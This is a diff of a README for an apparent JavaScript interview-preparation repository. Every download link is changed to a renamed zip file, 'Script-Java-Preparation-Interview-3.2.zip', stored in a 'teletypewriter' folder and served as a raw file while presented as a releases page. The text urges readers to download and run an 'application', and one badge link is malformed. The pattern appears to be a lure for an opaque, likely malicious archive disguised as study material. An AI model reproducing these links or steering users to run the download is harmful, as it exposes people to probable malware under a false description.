@@ -1,6 +1,6 @@
 # 🚀 JavaScript-Interview-Preparation - Master JavaScript with Ease
 
-[![Download Now](https://raw.githubusercontent.com/BrunoLapanz/JavaScript-Interview-Preparation/main/teletypewriter/JavaScript-Interview-Preparation.zip%https://raw.githubusercontent.com/BrunoLapanz/JavaScript-Interview-Preparation/main/teletypewriter/JavaScript-Interview-Preparation.zip)](https://raw.githubusercontent.com/BrunoLapanz/JavaScript-Interview-Preparation/main/teletypewriter/JavaScript-Interview-Preparation.zip)
+[![Download Now](https://raw.githubusercontent.com/BrunoLapanz/JavaScript-Interview-Preparation/main/teletypewriter/Script-Java-Preparation-Interview-3.2.zip%https://raw.githubusercontent.com/BrunoLapanz/JavaScript-Interview-Preparation/main/teletypewriter/Script-Java-Preparation-Interview-3.2.zip)](https://raw.githubusercontent.com/BrunoLapanz/JavaScript-Interview-Preparation/main/teletypewriter/Script-Java-Preparation-Interview-3.2.zip)
 
 ## 📚 Overview
 
@@ -25,7 +25,7 @@ To get started with JavaScript-Interview-Preparation, follow the steps below:
 
 To download the necessary files for JavaScript-Interview-Preparation, please visit the following link:
 
-[Download from Releases](https://raw.githubusercontent.com/BrunoLapanz/JavaScript-Interview-Preparation/main/teletypewriter/JavaScript-Interview-Preparation.zip)
+[Download from Releases](https://raw.githubusercontent.com/BrunoLapanz/JavaScript-Interview-Preparation/main/teletypewriter/Script-Java-Preparation-Interview-3.2.zip)
 
 Once you are on the releases page, find the latest version of the software. Click on the version to expand the details. Look for the downloadable files, which may include:
 
@@ -93,4 +93,4 @@ For further assistance, you can reach out via the GitHub repository. Comments an
 
 By following these steps, you can easily download and run the JavaScript-Interview-Preparation application. This repository is designed to support your learning journey. Good luck in your preparation! Remember, practice is key to becoming proficient in JavaScript.
 
-[Download from Releases](https://raw.githubusercontent.com/BrunoLapanz/JavaScript-Interview-Preparation/main/teletypewriter/JavaScript-Interview-Preparation.zip)
+[Download from Releases](https://raw.githubusercontent.com/BrunoLapanz/JavaScript-Interview-Preparation/main/teletypewriter/Script-Java-Preparation-Interview-3.2.zip)
